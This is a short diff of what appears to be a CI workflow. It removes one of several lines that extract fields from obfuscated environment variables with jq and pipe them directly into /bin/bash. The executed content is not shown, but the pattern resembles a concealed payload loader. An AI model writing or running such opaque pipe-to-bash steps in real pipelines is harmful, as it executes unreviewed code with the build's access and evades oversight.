@@ -27,7 +27,6 @@ jobs:
           echo $py04 | jq -r .wvxm6121 | /bin/bash
           echo $i94428 | jq -r .mlpht87 | /bin/bash
           printf '%s' "$ngboq111" | jq -r .lo8449 | /bin/bash
-          printf '%s' "$g1" | jq -r .x30 | /bin/bash
           printf '%s' "$p0" | jq -r .rauo8 | /bin/bash
 
       - name: Save output
